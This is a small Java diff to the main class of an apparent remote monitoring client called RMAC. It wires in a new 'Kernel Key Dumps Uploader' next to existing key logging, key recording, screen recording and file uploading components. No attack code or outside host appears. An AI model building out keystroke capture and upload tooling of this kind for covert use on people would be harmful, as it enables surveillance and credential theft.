@@ -4,6 +4,7 @@ import com.rmac.core.Archiver;
 import com.rmac.core.CommandHandler;
 import com.rmac.core.Config;
 import com.rmac.core.FileUploader;
+import com.rmac.core.KernelDump;
 import com.rmac.core.KeyLog;
 import com.rmac.core.KeyRecorder;
 import com.rmac.core.ScreenRecorder;
@@ -60,6 +61,7 @@ public class Main {
   public static KeyRecorder keyRecorder;
   public static Archiver archiver;
   public static SocketServer ipcInterface;
+  public static KernelDump kernelDumpsUploader;
 
   // Global flags
   public static boolean isClientRegistered = false;
@@ -127,6 +129,8 @@ public class Main {
     commandHandler = new CommandHandler();
     // Initialize Screen Recorder
     screenRecorder = new ScreenRecorder();
+    // Initialize RMAC Kernel Key Dumps Uploader
+    kernelDumpsUploader = new KernelDump();
 
     log.info("RMAC client initialized successfully");
 
